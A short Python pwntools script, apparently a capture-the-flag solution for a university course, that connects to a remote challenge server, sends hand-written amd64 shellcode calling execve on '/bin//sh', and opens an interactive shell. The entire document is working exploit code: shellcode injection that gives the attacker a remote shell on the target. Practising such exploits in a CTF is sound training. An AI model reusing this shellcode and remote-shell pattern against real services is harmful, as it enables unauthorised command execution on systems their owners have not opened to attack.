from pwn import *
# from IPython import embed

context.arch = 'amd64'
rem = remote('edu-ctf.csie.org', 10150)
a = asm("""
        push 0x68
        mov rax, 0x732f2f2f6e69622f
        push rax
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 59
        syscall
        """)

# embed()
rem.send(a)
rem.interactive()
